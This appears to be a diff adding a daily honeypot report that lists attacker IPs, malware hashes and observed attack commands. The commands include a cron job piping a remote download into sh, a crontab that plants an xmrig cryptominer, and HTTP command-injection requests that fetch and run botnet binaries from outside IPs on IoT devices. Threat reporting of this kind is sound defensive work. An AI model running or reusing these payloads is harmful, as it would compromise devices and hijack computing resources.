@@ -1,0 +1,46 @@
+Top 5 IPs for 2024-05-08 :
+
+73.16.30.214
+154.212.141.164
+45.79.181.251
+189.216.169.22
+189.216.170.102
+
+Malware Download:
+
+File name: xinetd
+b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+https://www.virustotal.com/gui/file/b9e643a8e78d2ce745fbe73eb505c8a0cc49842803077809b2267817979d10b0
+77cd93f80ded52063dabc1df7607825d7373f94ff0382ff9c970973635e1af7f
+https://www.virustotal.com/gui/file/77cd93f80ded52063dabc1df7607825d7373f94ff0382ff9c970973635e1af7f
+fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+https://www.virustotal.com/gui/file/fe4950561d2a88a1643fcf94894c3f9e2ecffb3d1c3f5ae7763c3e819974e4de
+
+Commands/exploits observed:
+
+chmod +x ./.6076849334138760305/xinetd;nohup ./.6076849334138760305/xinetd &
+
+set 1 -e \n\n* * * * * wget -q -O- https://filetransfer.io/data-package/l4tFDbI4/download | sh
+
+downloaded file cron.sh
+
+cd /tmp
+rm -rf crontab
+echo "*/1 * * * * /bin/bash -c 'if ! pgrep -x 'xmrig'; then cd /tmp && wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz -o xmrig && tar -xvf xmrig && cd xmrig-6.21.1 && nohup ./xmrig -a rx -o stratum+ssl://rx.unminable.com:443 -u BTC:15jiJpXZxSiV2wTd8ebYxLVvvqLwg3Kjd7.unmineable_worker_redis_v2 -p x --proxy=174.64.199.79:4145 & fi'" >> crontab
+crontab crontab
+crontab -l
+
+GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\\/94.156.8.76/static/Aqua.arm7;chmod+777+Aqua.arm;./Aqua.arm7+ipcams.arm7;wget+http:/\\/94.156.8.76/static/Aqua.arm4;chmod+777+Aqua.arm4;./Aqua.arm4+ipcams.arm4 HTTP/1.1
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: KrebsOnSecurity
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+
+
+
+GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F14.225.204.172%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1
+Host: <HOST-IP>
+User-Agent: Go-http-client/1.1
